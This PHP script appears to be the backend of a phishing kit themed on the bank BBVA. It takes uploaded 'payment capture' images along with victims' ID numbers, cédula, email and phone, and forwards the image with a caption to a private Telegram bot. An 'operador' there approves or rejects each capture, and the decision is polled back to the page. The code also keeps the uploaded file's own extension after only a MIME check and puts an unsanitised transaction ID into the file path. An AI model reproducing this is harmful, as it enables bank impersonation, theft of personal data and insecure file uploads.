<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);
header('Content-Type: application/json');

$USED_FILE = 'used_capturas.json';

function loadConfig()
{
    $configFile = __DIR__ . '/../config.php';

    if (!file_exists($configFile)) {
        return null;
    }

    $config = require $configFile;

    if (!isset($config['bot_token']) || !isset($config['chat_id'])) {
        return null;
    }

    return [
        'token' => $config['bot_token'],
        'chat_id' => $config['chat_id']
    ];
}

function getTransactions() {
    $file = $GLOBALS['USED_FILE'];
    return file_exists($file) ? json_decode(file_get_contents($file), true) : [];
}

function saveTransaction($id, $data) {
    $file = $GLOBALS['USED_FILE'];
    $all  = getTransactions();
    $all[$id] = $data;
    file_put_contents($file, json_encode($all));
}

function deleteTransaction($id) {
    $file = $GLOBALS['USED_FILE'];
    $all  = getTransactions();
    unset($all[$id]);
    file_put_contents($file, json_encode($all));
}

function sendPhotoToTelegram($token, $chatId, $photoPath, $caption, $keyboard)
{
    if (!file_exists($photoPath)) {
        return ['ok' => false, 'error' => 'Archivo de imagen no encontrado'];
    }

    $curlFile = new CURLFile($photoPath);

    $payload = [
        'chat_id' => $chatId,
        'caption' => $caption,
        'parse_mode' => 'HTML',
        'photo' => $curlFile,
        'reply_markup' => json_encode(['inline_keyboard' => $keyboard])
    ];

    $ch = curl_init("https://api.telegram.org/bot{$token}/sendPhoto");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $payload
    ]);

    $res = curl_exec($ch);
    curl_close($ch);

    return json_decode($res, true);
}

function editTelegramMessage($token, $chatId, $messageId, $newCaption)
{
    $payload = [
        'chat_id' => $chatId,
        'message_id' => $messageId,
        'caption' => $newCaption,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode(['inline_keyboard' => []])
    ];

    $ch = curl_init("https://api.telegram.org/bot{$token}/editMessageCaption");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $payload
    ]);

    curl_exec($ch);
    curl_close($ch);
}

$config = loadConfig();
if (!$config) {
    echo json_encode(['ok' => false, 'error' => '❌ No se pudo cargar config.php']);
    exit;
}

$BOT_TOKEN = $config['token'];
$CHAT_ID   = $config['chat_id'];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    if (!isset($_FILES['captura']) || $_FILES['captura']['error'] !== 0) {
        echo json_encode(['ok' => false, 'error' => 'No se recibió la imagen o hubo error en la subida']);
        exit;
    }

    $monto = $_POST['monto'] ?? '0';
    $identificacion = $_POST['identificacion'] ?? '';
    $correo = $_POST['correo'] ?? '';
    $celular = $_POST['celular'] ?? '';
    $cedula = $_POST['cedula'] ?? '';
    $persona = $_POST['persona'] ?? '';
    $tipoDocumento = $_POST['tipoDocumento'] ?? 'CC';
    $tid   = $_POST['transactionId'] ?? 'CAP_' . time();

    $allowed = ['image/jpeg', 'image/png', 'image/jpg'];
    $mime = mime_content_type($_FILES['captura']['tmp_name']);

    if (!in_array($mime, $allowed)) {
        echo json_encode(['ok' => false, 'error' => 'Formato inválido. Solo JPG/PNG']);
        exit;
    }

    $uploadDir = __DIR__ . '/uploads';
    if (!is_dir($uploadDir)) mkdir($uploadDir, 0775, true);

    $ext = strtolower(pathinfo($_FILES['captura']['name'], PATHINFO_EXTENSION));
    if (!$ext) $ext = 'jpg';

    $filename = "cap_bbva_{$tid}.{$ext}";
    $destPath = $uploadDir . '/' . $filename;

    if (!move_uploaded_file($_FILES['captura']['tmp_name'], $destPath)) {
        echo json_encode(['ok' => false, 'error' => 'Error al guardar imagen']);
        exit;
    }

    $montoFmt = number_format((float)$monto, 0, ',', '.');

    $caption  = "<b>📸 Captura de pago BBVA</b>\n";
    $caption .= "👤 Usuario: {$identificacion}\n";
    $caption .= "💰 Monto: <b>$ {$montoFmt}</b>\n\n";
    $caption .= "<b>Revisa la imagen y selecciona una opción:</b>";

    $keyboard = [
        [
            ['text' => '✅ Captura correcta', 'callback_data' => "capok:{$tid}"],
            ['text' => '❌ Captura incorrecta', 'callback_data' => "capbad:{$tid}"]
        ]
    ];

    $res = sendPhotoToTelegram($BOT_TOKEN, $CHAT_ID, $destPath, $caption, $keyboard);

    if (!empty($res['ok'])) {
        saveTransaction($tid, [
            'tid' => $tid,
            'identificacion' => $identificacion,
            'correo' => $correo,
            'celular' => $celular,
            'cedula' => $cedula,
            'persona' => $persona,
            'tipoDocumento' => $tipoDocumento,
            'monto' => $monto,
            'message_id' => $res['result']['message_id'],
            'created_at' => time(),
            'status' => 'pending'
        ]);

        echo json_encode(['ok' => true, 'tid' => $tid, 'message' => 'Captura BBVA enviada']);
        exit;
    }

    echo json_encode(['ok' => false, 'error' => 'Error enviando a Telegram']);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {

    $tid = $_GET['transactionId'];

    $updates = json_decode(file_get_contents("https://api.telegram.org/bot{$BOT_TOKEN}/getUpdates"), true);

    $lastUpdateId = 0;

    if (!isset($updates['result'])) {
        echo json_encode(['ok' => false]);
        exit;
    }

    foreach ($updates['result'] as $update) {

        if (isset($update['update_id'])) {
            $lastUpdateId = $update['update_id'];
        }

        if (!isset($update['callback_query'])) continue;

        $cb    = $update['callback_query'];
        $data  = $cb['data'] ?? '';
        $from  = $cb['from']['username'] ?? $cb['from']['first_name'] ?? 'operador';

        $parts = explode(':', $data);

        if (count($parts) !== 2 || $parts[1] !== $tid) continue;

        $accion = $parts[0];
        $cbid   = $cb['id'];

        @file_get_contents("https://api.telegram.org/bot{$BOT_TOKEN}/answerCallbackQuery?callback_query_id={$cbid}");

        $trans = getTransactions();
        if (!isset($trans[$tid])) continue;

        $t = $trans[$tid];

        if ($accion == 'capok') {
            $txt = 'Captura correcta';
            $clientAction = 'aprobado';
        } else {
            $txt = 'Captura incorrecta';
            $clientAction = 'rechazado';
        }

        $nuevoCaption  = "<b>📸 Captura BBVA procesada</b>\n";
        $nuevoCaption .= "• 👤 Usuario: <code>{$t['identificacion']}</code>\n";
        $nuevoCaption .= "• 💰 Monto: <b>$ " . number_format((float)$t['monto'], 0, ',', '.') . "</b>\n\n";
        $nuevoCaption .= "✅ Acción: <b>{$txt}</b>\n";
        $nuevoCaption .= "👤 Por: @{$from}";

        editTelegramMessage($BOT_TOKEN, $CHAT_ID, $t['message_id'], $nuevoCaption);

        deleteTransaction($tid);

        if ($lastUpdateId > 0) {
            file_get_contents("https://api.telegram.org/bot{$BOT_TOKEN}/getUpdates?offset=" . ($lastUpdateId + 1));
        }

        echo json_encode(['ok' => true, 'action' => $clientAction]);
        exit;
    }

    if ($lastUpdateId > 0) {
        file_get_contents("https://api.telegram.org/bot{$BOT_TOKEN}/getUpdates?offset=" . ($lastUpdateId + 1));
    }

    echo json_encode(['ok' => false]);
    exit;
}

echo json_encode(['ok' => false, 'error' => '⛔ Método inválido']);
exit;
?>